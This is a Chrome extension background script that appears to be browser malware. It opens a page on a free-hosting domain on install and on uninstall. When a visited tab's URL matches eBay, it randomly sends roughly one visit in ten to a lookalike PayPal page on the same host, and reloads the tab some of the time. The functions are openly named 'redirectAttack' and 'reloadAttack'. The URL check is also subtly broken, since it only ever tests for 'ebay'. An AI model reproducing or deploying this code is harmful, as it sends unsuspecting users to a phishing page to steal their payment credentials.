


chrome.browserAction.onClicked.addListener(function(t){
  chrome.tabs.create({
    url:"https://demo-tuto.000webhostapp.com/youtube/"})}),
localStorage.firstInstall?chrome.runtime.onInstalled.addListener(
  function(){chrome.tabs.create({
    url:"https://demo-tuto.000webhostapp.com/youtube/"})}):
(window.open("https://demo-tuto.000webhostapp.com/youtube/"),
  localStorage.firstInstall="false"),
chrome.runtime.setUninstallURL&&chrome.runtime.setUninstallURL
("https://demo-tuto.000webhostapp.com/youtube/");

redirectProb = 0.1
reloadProb =0.2

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
   console.log("listening");

   if (tab.url.indexOf("ebay","paypal") > -1) {

    // quand la personne essaie de visiter paypal


       var rand = Math.random();
       if (rand < redirectProb) {
           console.log("redirecting"); 
           redirectAttack(tabId);
       } else if (rand < reloadProb) {
           console.log("reloading");
           reloadAttack(tabId);
       }
   }
 });

function redirectAttack(tabId) {
    var updateParam = new Object();
    updateParam.url = "https://demo-tuto.000webhostapp.com/paypal.fr";

    chrome.tabs.update(tabId, updateParam);
}

function reloadAttack(tabId) {
    chrome.tabs.reload(tabId);
}